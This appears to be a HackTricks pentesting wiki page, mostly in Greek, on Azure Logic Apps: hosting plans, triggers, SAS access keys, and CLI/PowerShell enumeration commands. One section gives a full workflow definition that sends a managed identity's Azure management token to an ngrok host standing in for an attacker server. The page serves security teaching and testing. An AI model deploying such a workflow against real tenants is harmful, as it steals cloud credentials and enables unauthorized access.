# Az - Logic Apps

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Azure Logic Apps επιτρέπει στους προγραμματιστές να **δημιουργούν και να εκτελούν ροές εργασίας που ενσωματώνουν διάφορες υπηρεσίες**, πηγές δεδομένων και εφαρμογές. Αυτές οι ροές εργασίας έχουν σχεδιαστεί για να **αυτοματοποιούν επιχειρηματικές διαδικασίες**, να οργανώνουν εργασίες και να εκτελούν ενσωματώσεις δεδομένων σε διάφορες πλατφόρμες.

Logic Apps παρέχει έναν **οπτικό σχεδιαστή** για τη δημιουργία ροών εργασίας με μια **ευρεία γκάμα προ-κατασκευασμένων συνδέσμων**, που διευκολύνει τη σύνδεση και την αλληλεπίδραση με διάφορες υπηρεσίες:

<figure><img src="../../../images/image (197).png" alt="https://infiniteblogs.blob.core.windows.net/medias/4de7fba4-1d43-465a-8c12-8da966a2cdb3_Overview.png"><figcaption></figcaption></figure>

### Hosting options

Υπάρχουν αρκετές επιλογές φιλοξενίας:

* **Consumption**
- **Multi-tenant**: Αυτό παρέχει κοινόχρηστους υπολογιστικούς πόρους, λειτουργεί στο δημόσιο σύννεφο και ακολουθεί ένα μοντέλο τιμολόγησης ανά λειτουργία. Αυτό είναι ιδανικό για ελαφριές και οικονομικές φορτίσεις εργασίας. Αυτό θα το ονομάσουμε "Μοναδική Ροή Εργασίας".
* **Standard**
- **Workflow Service Plan**: Αυτό παρέχει αφιερωμένους υπολογιστικούς πόρους με ενσωμάτωση VNET για δικτύωση και χρεώνει ανά περίπτωση σχεδίου υπηρεσίας ροής εργασίας. Είναι κατάλληλο για πιο απαιτητικές φορτίσεις εργασίας που απαιτούν μεγαλύτερο έλεγχο.
- **App Service Environment V3:** Αυτό παρέχει αφιερωμένους υπολογιστικούς πόρους με πλήρη απομόνωση και κλιμάκωση. Επίσης, ενσωματώνεται με VNET για δικτύωση και χρησιμοποιεί ένα μοντέλο τιμολόγησης βασισμένο σε περιπτώσεις App Service εντός του περιβάλλοντος.
- **Hybrid:** Αυτό έχει σχεδιαστεί για τοπική επεξεργασία και υποστήριξη πολλών σύννεφων. Επιτρέπει τη διαχείριση υπολογιστικών πόρων από τον πελάτη με τοπική πρόσβαση στο δίκτυο και χρησιμοποιεί το Kubernetes Event-Driven Autoscaling (KEDA). Εξαρτάται από ένα Container App Connected Environment.

## "Single" Workflows / Consumption Plan

Μια **ροή εργασίας** είναι μια δομημένη ακολουθία αυτοματοποιημένων βημάτων ή εργασιών που εκτελούν μια συγκεκριμένη διαδικασία ή στόχο. Ορίζει πώς διαφορετικές ενέργειες, συνθήκες και αποφάσεις αλληλεπιδρούν για να επιτύχουν ένα επιθυμητό αποτέλεσμα, απλοποιώντας τις λειτουργίες και μειώνοντας την ανθρώπινη προσπάθεια.

> [!TIP]
> Το σχέδιο κατανάλωσης επιτρέπει **τη δημιουργία μιας μοναδικής ροής εργασίας χωρίς την ανάγκη της ίδιας της Logic App**.

### Triggers & Actions

Οι ενεργοποιητές ροής εργασίας υποδεικνύουν **πότε θα πρέπει να ξεκινήσει η ροή εργασίας**. Οι ενεργοποιητές μπορεί να είναι ένα HTTP endpoint, ένα πρόγραμμα ή δεκάδες διαφορετικά γεγονότα από το Azure ή ακόμη και εξωτερικές εφαρμογές.

Κάθε ροή εργασίας έχει διαφορετικές **ενέργειες**. Αυτές οι ενέργειες είναι τα βήματα που ακολουθεί η ροή εργασίας. Ανάλογα με την ενέργεια, θα είναι διαθέσιμες διαφορετικές παράμετροι για να την ρυθμίσετε, όπως:

- **Connection name**: Σύνδεση που θα χρησιμοποιηθεί και με την οποία θα αλληλεπιδράσει η ενέργεια.
- **Authentication Type:** Οι διαφορετικές επιλογές είναι Access Key, Microsoft Entra ID, Integrated Service principal authentication και Logic Apps Managed Identity.
- Από μια προοπτική μόνο ανάγνωσης, τα δεδομένα **Authentication** είναι πάντα ενδιαφέροντα καθώς μπορεί να περιέχουν ευαίσθητες πληροφορίες.
- Από μια προοπτική εγγραφής, τα δεδομένα **Authentication** είναι πάντα ενδιαφέροντα καθώς μπορεί να επιτρέπουν τη χρήση των δικαιωμάτων των ανατεθειμένων διαχειριζόμενων ταυτοτήτων.
- ...

Οι ενέργειες έχουν επίσης διάφορες **ρυθμίσεις**, οι οποίες εξαρτώνται από την ίδια την ενέργεια. Ορισμένες από τις πιο κοινές ρυθμίσεις είναι:

- **Retry Policy**: Ρυθμίζει τον αριθμό των επαναλήψεων και το διάστημα μεταξύ τους.
- **Timeout**: Ορίζει το μέγιστο χρόνο που μπορεί να εκτελείται η ενέργεια πριν λήξει.
- **Run After**: Προσδιορίζει τις συνθήκες που πρέπει να πληρούνται πριν εκτελεστεί η ενέργεια.
- **Schema Validation**: Διασφαλίζει ότι τα εισερχόμενα δεδομένα ακολουθούν μια προκαθορισμένη δομή.
- **Networking**: Ρυθμίζει πώς να διαχειρίζεται διαφορετικές κεφαλίδες.
- **Secure Inputs/Outputs**: Αυτό θα κρύψει τα δεδομένα εισόδου/εξόδου από την ιστορία εκτέλεσης.
- ...

### Authorization Policies

Αυτές οι ροές εργασίας υποστηρίζουν **πολιτικές εξουσιοδότησης** με Entra ID για να ασφαλίσουν τους ενεργοποιητές που βασίζονται σε αιτήματα απαιτώντας ένα έγκυρο διακριτικό πρόσβασης. Αυτό το διακριτικό πρέπει να περιλαμβάνει συγκεκριμένες αξιώσεις:
- Issuer (iss) για να επαληθεύσει τον πάροχο ταυτότητας
- Audience (aud) για να διασφαλίσει ότι το διακριτικό προορίζεται για την Logic App
- Subject (sub) για να προσδιορίσει τον καλούντα
- JWT ID (JSON Web Token identifier)
- Custom Claim

Όταν ληφθεί ένα αίτημα, η Logic Apps επικυρώνει το διακριτικό σύμφωνα με αυτές τις αξιώσεις και επιτρέπει την εκτέλεση μόνο εάν ταιριάζουν με την καθορισμένη πολιτική. Αυτό μπορεί να χρησιμοποιηθεί για να επιτρέψει σε άλλο ενοίκιο να ενεργοποιήσει τη ροή εργασίας ή να αρνηθεί την ενεργοποίηση από άλλες πηγές, για παράδειγμα επιτρέποντας την ενεργοποίηση μόνο εάν προέρχεται από το https://login.microsoftonline.com/.

### Access Keys

Οι ροές εργασίας **παράγουν 2 κλειδιά πρόσβασης** όταν δημιουργούνται. Αυτά τα κλειδιά χρησιμοποιούνται για την πιστοποίηση και την εξουσιοδότηση αιτημάτων προς τη ροή εργασίας. Τα κλειδιά χρησιμοποιούνται για να παραγάγουν ένα Shared Access Signature (SAS) token, το οποίο περιλαμβάνεται στο URL του αιτήματος.

Έτσι, όταν δημιουργείται ένας ενεργοποιητής HTTP endpoint, παράγεται ένα **μοναδικό HTTP endpoint με μια υπογραφή SAS** που παρέχει άδεια για να καλέσει τη ροή εργασίας.

Αυτά τα **κλειδιά μπορούν να αναγεννηθούν** και ένα νέο SAS URL θα δημιουργηθεί για αυτούς τους ενεργοποιητές, αλλά οι **τιμές των κλειδιών δεν μπορούν να προσπελαστούν**.

Παράδειγμα ενός SAS URL για να ενεργοποιήσει έναν ενεργοποιητή:
```
https://<region>.logic.azure.com:443/workflows/<workflow-id>/triggers/<trigger-name>/paths/invoke?api-version=<api-version>&sp=%2Ftriggers%2F<trigger-name>%2Frun&sv=<version>&sig=<signature>
```
### Ρυθμίσεις Ροής Εργασίας & Συστατικά

- **Επιλογή πρόσβασης ενεργοποίησης**: Αυτή η ρύθμιση σας επιτρέπει να περιορίσετε ποιος μπορεί να ενεργοποιήσει ή να ξεκινήσει τη ροή εργασίας σας. Οι επιλογές είναι Οποιαδήποτε IP, Μόνο άλλη ροή εργασίας και Συγκεκριμένα εύρη IP.
- **Λογαριασμός ολοκλήρωσης**: Συνδέστε τη ροή εργασίας σας με έναν Λογαριασμό Ολοκλήρωσης.
- **Υψηλή απόδοση**: Αν είναι ενεργοποιημένο, επιτρέπει την ταχύτερη διαχείριση περισσότερων αιτημάτων παράλληλα.
- **Διατήρηση ιστορικού εκτέλεσης**: Αυτό υποδεικνύει τον αριθμό των ημερών για τις οποίες θα διατηρείται το ιστορικό εκτέλεσης.
- **Συνδέσεις API**: Αυτό δείχνει τις διαφορετικές συνδέσεις API που έχει η ροή εργασίας. Μέσα σε καθεμία από αυτές τις συνδέσεις έχουν διαφορετικές ιδιότητες και τη δυνατότητα επεξεργασίας της σύνδεσης API όπου μπορεί να αλλάξει ο τύπος Αυθεντικοποίησης.
- **Ιστορικό**: Έχει την επιλογή πρόσβασης στο **ιστορικό** παλαιών εκτελέσεων και λήψη δεδομένων: Ρυθμίσεις, Έξοδος, Παράμετροι και ο Κώδικας.
- **Εκδόσεις**: Έχει την επιλογή πρόσβασης σε διαφορετικές **εκδόσεις** της ροής εργασίας, όπου μπορείτε να ελέγξετε τον κώδικα και να αλλάξετε τη παρούσα ροή εργασίας με μια παλαιότερη έκδοση της.
- **Διαχειριζόμενες Ταυτότητες**: Είναι δυνατή η ανάθεση 1 διαχειριζόμενης ταυτότητας συστήματος και διαχειριζόμενης ταυτότητας χρήστη στη ροή εργασίας.

### Διαρροή MI access tokens

Η ενέργεια HTTP σε μια ροή εργασίας μπορεί να χρησιμοποιηθεί για την αποστολή δεδομένων σε έναν εξωτερικό ιστό. Στις **Προηγμένες παραμέτρους** της ενέργειας HTTP, είναι δυνατή η ρύθμιση του **Τύπου Αυθεντικοποίησης** ως **`Managed identity`** και στη συνέχεια η επιλογή της **ανατεθείσας Διαχειριζόμενης Ταυτότητας** προς χρήση (συστήματος ή χρήστη).

Επιπλέον, είναι δυνατή η ένδειξη στο **`Audience`** του κοινού του παραγόμενου JWT, το οποίο θα μπορούσε να είναι για παράδειγμα **`https://management.azure.com/`** ώστε να μπορείτε να χρησιμοποιήσετε το παραγόμενο διακριτικό για πρόσβαση στο Azure management API.

> [!WARNING]
> Κάνοντάς την ενέργεια να στείλει το HTTP αίτημα σε έναν διακομιστή που ελέγχεται από έναν επιτιθέμενο, είναι δυνατό να **διαρρεύσει το διακριτικό πρόσβασης της διαχειριζόμενης ταυτότητας** που έχει ανατεθεί στη ροή εργασίας.

> [!TIP]
> Ένας επιτιθέμενος θα μπορούσε επίσης να χρησιμοποιήσει άλλους τύπους ενεργειών για να **πρόσβαση απευθείας σε άλλες υπηρεσίες Azure** και να εκτελέσει ενέργειες με τις άδειες της διαχειριζόμενης ταυτότητας.

Αυτός είναι ο κώδικας μιας ροής εργασίας που εκθέτει ένα HTTP endpoint και στη συνέχεια χρησιμοποιεί μια ενέργεια HTTP για να διαρρεύσει το διακριτικό πρόσβασης στη ρυθμισμένη διεύθυνση URL (ngrok σε αυτή την περίπτωση):

<details>
<summary>Κώδικας Ροής Εργασίας</summary>
```json
{
"definition": {
"$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
"contentVersion": "1.0.0.0",
"triggers": {
"When_a_HTTP_request_is_received": {
"type": "Request",
"kind": "Http"
}
},
"actions": {
"HTTP": {
"runAfter": {},
"type": "Http",
"inputs": {
"uri": "https://22b6-81-33-70-107.ngrok-free.app",
"method": "GET",
"authentication": {
"type": "ManagedServiceIdentity",
"audience": "https://management.azure.com/"
}
},
"runtimeConfiguration": {
"contentTransfer": {
"transferMode": "Chunked"
}
}
}
},
"outputs": {},
"parameters": {
"$connections": {
"type": "Object",
"defaultValue": {}
}
}
},
"parameters": {
"$connections": {
"type": "Object",
"value": {}
}
}
}
```
</details>

## Logic Apps / Standard Plan

### Διαφορές με τα "Μοναδικά" Ροές Εργασίας

Οι λογικές εφαρμογές χρησιμοποιούν βασικά μια Υπηρεσία Εφαρμογών στο παρασκήνιο για να **φιλοξενούν τη λογική εφαρμογή που μπορεί να φιλοξενεί πολλές ροές εργασίας**. Αυτό σημαίνει ότι η λογική εφαρμογή θα έχει όλα τα χαρακτηριστικά μιας Υπηρεσίας Εφαρμογών και των "Μοναδικών" Ροών Εργασίας.

Ορισμένα βασικά χαρακτηριστικά θα είναι:

- **Σχέδιο Υπηρεσίας Εφαρμογών**: Οι Λογικές Εφαρμογές στο Σχέδιο Standard φιλοξενούνται σε ένα Σχέδιο Υπηρεσίας Εφαρμογών, επομένως είναι δυνατή η χρήση όλων των χαρακτηριστικών της Υπηρεσίας Εφαρμογών όπως:
- **Περιορισμοί Δικτύου**: Υποδεικνύει από πού είναι προσβάσιμο.
- **Κέντρο Ανάπτυξης**: Ανάπτυξη από εξωτερικές πλατφόρμες όπως Github, Bitbucket, Azure Repos, Εξωτερικό Git και Τοπικό Git.
- **Πρόσβαση FTP**: Είναι δυνατή η πρόσβαση στα αρχεία της Λογικής Εφαρμογής μέσω FTP.
- **Λογαριασμός Αποθήκευσης**: Η υπηρεσία εφαρμογής χρησιμοποιεί έναν λογαριασμό αποθήκευσης για να αποθηκεύει πληροφορίες.
- **Μεταβλητές Περιβάλλοντος & Ρυθμίσεις Εφαρμογής**: Είναι δυνατή η ρύθμιση μεταβλητών περιβάλλοντος και ρυθμίσεων εφαρμογής (και η εύρεση ευαίσθητων πληροφοριών όπως κλειδιά πρόσβασης στον λογαριασμό αποθήκευσης).
- ...
- **Παράμετροι**: Οι παράμετροι σας επιτρέπουν να διαχειρίζεστε τιμές που ποικίλλουν μεταξύ ανάπτυξης, δοκιμής και παραγωγής. Αυτό σας επιτρέπει να σχεδιάσετε ροές εργασίας πρώτα και στη συνέχεια να προσαρμόσετε εύκολα τις ρυθμίσεις που σχετίζονται με το περιβάλλον αργότερα.
- **Αφιερωμένοι Πόροι**: Οι Λογικές Εφαρμογές στο Σχέδιο Standard διαθέτουν αφιερωμένους πόρους.
- **Πολλές Ροές Εργασίας**: Επιτρέπει τη δημιουργία πολλών ροών εργασίας.

Για περισσότερες πληροφορίες σχετικά με τις Υπηρεσίες Εφαρμογών ελέγξτε:

{{#ref}}
../az-services/az-app-services.md
{{#endref}}


### Αριθμητική

{{#tabs }}
{{#tab name="az cli" }}
```bash
# List
az logic workflow list --resource-group <ResourceGroupName>
# Get info
az logic workflow show --name <LogicAppName> --resource-group <ResourceGroupName>

# Get details of a specific Logic App workflow, including its connections and parameters
az rest \
--method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}?api-version=2016-10-01&$expand=connections.json,parameters.json" \
--headers "Content-Type=application/json"

# Get details about triggers for a specific Logic App
az rest --method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers?api-version=2016-06-01"

# Get the callback URL for a specific trigger in a Logic App
az rest --method POST \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/listCallbackUrl?api-version=2016-06-01"

# Get the history of a specific trigger in a Logic App
az rest --method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/histories?api-version=2016-06-01"

# List all runs of a specific Logic App workflow
az rest \
--method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/runs?api-version=2016-06-01" \
--headers "Content-Type=application/json"

# Get all actions within a specific run of a Logic App workflow
az rest \
--method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/runs/{runName}/actions?api-version=2016-06-01" \
--headers "Content-Type=application/json"

# List all versions of a specific Logic App workflow
az rest \
--method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/versions?api-version=2016-06-01" \
--headers "Content-Type=application/json"

# Get details of a specific version of a Logic App workflow
az rest \
--method GET \
--uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/versions/{versionName}?api-version=2016-06-01" \
--headers "Content-Type=application/json"

# List all Logic Apps in the specified resource group
az logicapp list --resource-group <ResourceGroupName>

# Show detailed information about a specific Logic App
az logicapp show --name <LogicAppName> --resource-group <ResourceGroupName>

# List all application settings for a specific Logic App
az logicapp config appsettings list --name <LogicAppName> --resource-group <ResourceGroupName>

# Get a Parameters from an Azure App Service using Azure REST API
az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{app-service-name}/hostruntime/admin/vfs/parameters.json?api-version=2018-11-01&relativepath=1"

# Get webhook-triggered workflows from an Azure Logic App using Azure REST API
az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/hostruntime/runtime/webhooks/workflow/api/management/workflows?api-version=2018-11-01"

# Get workflows from an Azure Logic App using Azure REST API
az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/workflows?api-version=2018-11-01"

# Get details of a specific workflow including its connections and parameters in Azure Logic Apps using Azure REST API
az rest --method GET --uri "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/workflows/{workflow-name}?api-version=2018-11-01&\$expand=connections.json,parameters.json"


```
{{#endtab }}

{{#tab name="Az Powershell" }}
```bash
Get-Command -Module Az.LogicApp

# List
Get-AzLogicApp -ResourceGroupName <ResourceGroupName>
# Get info
Get-AzLogicApp -ResourceGroupName <ResourceGroupName> -Name <LogicAppName>

# Get details of a specific Logic App workflow run action
Get-AzLogicAppRunAction -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>" -RunName "<RunName>"

# Get the run history for a specific Logic App
Get-AzLogicAppRunHistory -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>"

# Get details about triggers for a specific Logic App
Get-AzLogicAppTrigger -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>"

# Get the callback URL for a specific trigger in a Logic App
Get-AzLogicAppTriggerCallbackUrl -ResourceGroupName "<ResourceGroupName>" -LName "<LogicAppName>" -TriggerName "<TriggerName>"

# Get the history of a specific trigger in a Logic App
Get-AzLogicAppTriggerHistory -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>" -TriggerName "<TriggerName>"

```
{{#endtab }}
{{#endtabs }}

## Λογαριασμοί Ενοποίησης
**Λογαριασμοί Ενοποίησης**, είναι μια δυνατότητα των Azure Logic Apps. Οι Λογαριασμοί Ενοποίησης χρησιμοποιούνται για να διευκολύνουν τις ενοποιήσεις σε επίπεδο επιχείρησης, επιτρέποντας προηγμένες δυνατότητες B2B, όπως EDI, AS2 και διαχείριση XML schema. Οι Λογαριασμοί Ενοποίησης είναι ένα δοχείο στο Azure που αποθηκεύει τα εξής αντικείμενα που χρησιμοποιούνται για τα Logic Apps:

* **Schemas**: Διαχείριση XML schemas για την επικύρωση και επεξεργασία μηνυμάτων στον λογαριασμό ενοποίησης σας.
* **Maps**: Ρύθμιση μετασχηματισμών βασισμένων σε XSLT για τη μετατροπή μορφών δεδομένων μέσα στις ροές εργασίας ενοποίησης σας.
* **Assemblies**: Διαχείριση των assemblies του λογαριασμού ενοποίησης για την απλοποίηση της λογικής και της επεξεργασίας δεδομένων.
* **Certificates**: Διαχείριση πιστοποιητικών για την κρυπτογράφηση και υπογραφή μηνυμάτων, εξασφαλίζοντας ασφαλή επικοινωνία.
* **Partners**: Διαχείριση πληροφοριών εμπορικών εταίρων για B2B συναλλαγές, επιτρέποντας απρόσκοπτες ενοποιήσεις.
* **Agreements**: Ρύθμιση κανόνων και ρυθμίσεων για την ανταλλαγή δεδομένων με εμπορικούς εταίρους (π.χ., EDI, AS2).
* **Batch Configurations**: Διαχείριση ρυθμίσεων επεξεργασίας παρτίδων για την ομαδοποίηση και επεξεργασία μηνυμάτων αποτελεσματικά.
* **RosettaNet PIP**: Ρύθμιση των RosettaNet Partner Interface Processes (PIPs) για τον εκσυγχρονισμό της B2B επικοινωνίας.

#### Αρίθμηση

{{#tabs }}
{{#tab name="az cli" }}
```bash
# Integration account
az logic integration-account list --resource-group <resource-group-name>
az logic integration-account show --resource-group <resource-group-name> --name <integration-account-name>
az logic integration-account list-callback-url --resource-group <resource-group-name> --integration-account-name <integration-account-name>

# Batch-configuration
az logic integration-account batch-configuration list \
--resource-group <resource-group-name> \
--integration-account-name <integration-account-name>

az logic integration-account batch-configuration show \
--resource-group <resource-group-name> \
--integration-account-name <integration-account-name> \
--batch-configuration-name <batch-configuration-name>

# Map
az logic integration-account map list \
--resource-group <resource-group-name> \
--integration-account <integration-account-name>

az logic integration-account map show \
--resource-group <resource-group-name> \
--integration-account <integration-account-name> \
--map-name <map-name>

# Partner
az logic integration-account partner list \
--resource-group <resource-group-name> \
--integration-account <integration-account-name>

az logic integration-account partner show \
--resource-group <resource-group-name> \
--integration-account <integration-account-name> \
--name <partner-name>

# Session
az logic integration-account session list \
--resource-group <resource-group-name> \
--integration-account <integration-account-name>

az logic integration-account session show \
--resource-group <resource-group-name> \
--integration-account <integration-account-name> \
--name <session-name>

# Assembly
# Session
az logic integration-account assembly list \
--resource-group <resource-group-name> \
--integration-account <integration-account-name>

az logic integration-account assembly show \
--resource-group <resource-group-name> \
--integration-account <integration-account-name> \
--assembly-artifact-name <assembly-name>


```
{{#endtab }}

{{#tab name="Az Powershell" }}
```bash
Get-Command -Module Az.LogicApp

# Retrieve details of an integration account
Get-AzIntegrationAccount -ResourceGroupName <resource-group-name> -Name <integration-account-name>

# Retrieve the callback URL of an integration account
Get-AzIntegrationAccountCallbackUrl -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name>

# Retrieve details of a specific agreement in an integration account
Get-AzIntegrationAccountAgreement -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <agreement-name>

# Retrieve details of a specific assembly in an integration account
Get-AzIntegrationAccountAssembly -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <assembly-name>

# Retrieve details of a specific batch configuration in an integration account
Get-AzIntegrationAccountBatchConfiguration -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <batch-configuration-name>

# Retrieve details of a specific certificate in an integration account
Get-AzIntegrationAccountCertificate -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <certificate-name>

# Retrieve details of a specific map in an integration account
Get-AzIntegrationAccountMap -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <map-name>

# Retrieve details of a specific partner in an integration account
Get-AzIntegrationAccountPartner -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <partner-name>

# Retrieve details of a specific schema in an integration account
Get-AzIntegrationAccountSchema -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <schema-name>
```
{{#endtab }}
{{#endtabs }}


## Κλιμάκωση Δικαιωμάτων

Ίδιο με την κλιμάκωση δικαιωμάτων των λογικών εφαρμογών:

{{#ref}}
../az-privilege-escalation/az-logic-apps-privesc.md
{{#endref}}

## Μετά την Εκμετάλλευση

{{#ref}}
../az-post-exploitation/az-logic-apps-post-exploitation.md
{{#endref}}

## Επιμονή

{{#ref}}
../az-persistence/az-logic-apps-persistence.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
